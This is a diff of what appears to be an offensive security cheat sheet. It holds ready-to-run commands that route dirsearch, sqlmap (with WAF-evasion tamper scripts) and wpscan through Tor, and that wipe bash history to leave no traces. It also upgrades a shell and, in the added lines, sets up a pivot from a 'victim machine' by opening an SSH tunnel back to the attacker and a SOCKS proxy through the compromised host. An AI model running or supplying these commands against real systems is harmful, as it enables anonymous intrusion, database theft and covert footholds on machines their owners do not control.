@@ -2,8 +2,10 @@
 tor-resolve www.example.com localhost:9050
 
 
+
 # enumerate directories and files using DirSearch via TOR
 torify dirsearch -u https://www.example.com -e php -f --random-user-agents --suppress-empty -x 404,403,301
+
 
 
 # dump a DB using SQLMap via TOR
@@ -11,12 +13,15 @@ sqlmap --check-tor --tor --random-agent -u 'https://www.example.com/test.php?id=
 sqlmap --check-tor --tor --random-agent -u 'https://www.example.com/test.php?id=1' --tamper="between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor"
 
 
+
 # scan a WordPress site using WPScan via TOR
 wpscan --url www.example.com --rua --disable-tls-checks -e vp,vt,cb,dbe,u --proxy socks5://127.0.0.1:9050
 
 
+
 # fetch a web content using cURL via TOR
 curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" -s --socks5-hostname 127.0.0.1:9050 https://www.example.com
+
 
 
 # delete BASH history and avoid saving commands (= leave no traces)
@@ -30,6 +35,7 @@ export HISTFILESIZE=0
 history -c ; rm -f $HISTFILE ; unset HISTFILE ; set +o history ; export HISTSIZE=0 ; export HISTFILESIZE=0
 
 
+
 # upgrade a shell to a fully functional interactive shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 -> CTRL+Z
@@ -38,5 +44,27 @@ fg
 reset
 
 
+
 # complete DNS enumeration with AMASS
 amass -v -whois -ip -active -brute -d example.com
+
+
+
+# pivoting by executing a SOCKS5 server on a compromised target and forwarding the local port remotely via SSH
+# -> on your attacking machine:
+TARGET=victim
+mkdir -p /tmp/targets/$TARGET
+useradd -m -s /bin/nologin $TARGET
+ssh-keygen -t ecdsa -f /tmp/targets/$TARGET/sshkey -q -N ""
+mkdir /home/$TARGET/.ssh
+cp /tmp/targets/$TARGET/sshkey.pub /home/$TARGET/.ssh/authorized_keys
+chown -R $TARGET:$TARGET /home/$TARGET/.ssh
+chmod 600 /home/$TARGET/.ssh/authorized_keys
+cat /tmp/targets/$TARGET/sshkey
+(copy private key content)
+# -> on the victim machine:
+echo "pasted sshkey content" >> /tmp/.keyfile
+chmod 600 /tmp/.keyfile
+ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -L 22:127.0.0.1:2222 -i /tmp/.keyfile -fNT $TARGET@attackingmachine
+# -> on your attacking machine:
+ssh -D 0.0.0.0:8080 compromiseduser@127.0.0.1 -p 2222 -fNT
